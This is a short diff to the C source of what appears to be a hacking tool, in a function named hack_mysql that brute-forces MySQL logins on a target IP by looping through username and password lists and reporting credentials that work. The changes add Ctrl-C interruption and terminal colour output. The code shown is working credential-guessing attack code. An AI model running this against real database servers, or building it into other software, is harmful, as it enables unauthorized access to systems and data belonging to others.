@@ -11,11 +11,12 @@
 #include "TCP_Syn_Port_Scanner.h"
 
 int hack_mysql(in_addr_t ip, int port, int type){
+	signal(SIGINT, sigintHandler);
 	MYSQL *conn=NULL;
 	switch(type){
 	case MYSQL_BRUTE_FORCE:
+		printf("%s",DEFAULT);
 		printf("\nTrying to perform connections by using brute force...\n\n");
-		printf("%s",BLUE);
 		double totalComb=0, cont=0;
 		int i=0;
 		FILE *f=NULL;
@@ -32,8 +33,9 @@ int hack_mysql(in_addr_t ip, int port, int type){
 		i=0;
 		while(fscanf(f,"%s", passwords[i])!=EOF) i++;
 		totalComb=totalUsernames*totalPasswords;
-		for(i=0;i<totalUsernames;i++){
-			for(int j=0;j<totalPasswords;j++,cont++){
+		printf("%s",HWHITE);
+		for(i=0;i<totalUsernames && finishCurrentProcess==FALSE;i++){
+			for(int j=0;j<totalPasswords && finishCurrentProcess==FALSE;j++,cont++){
 				printf("\rPercentaje completed: %.4lf%% (%s/%s)               ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
 				fflush(stdout);
 				usleep(BRUTE_FORCE_DELAY);
@@ -48,6 +50,7 @@ int hack_mysql(in_addr_t ip, int port, int type){
 					printf("\n\nLoging successfull with user: %s, password: %s. Service Vulnerable\n\n",usernames[i], passwords[j]);
 					mysql_close(conn);
 					conn=NULL;
+					printf("%s",HWHITE);
 				}
 			}
 		}
@@ -56,6 +59,7 @@ int hack_mysql(in_addr_t ip, int port, int type){
 		break;
 	}
 	mysql_close(conn);
+	finishCurrentProcess=FALSE;
 	printf("%s",DEFAULT);
 	return RETURN_OK;
 }
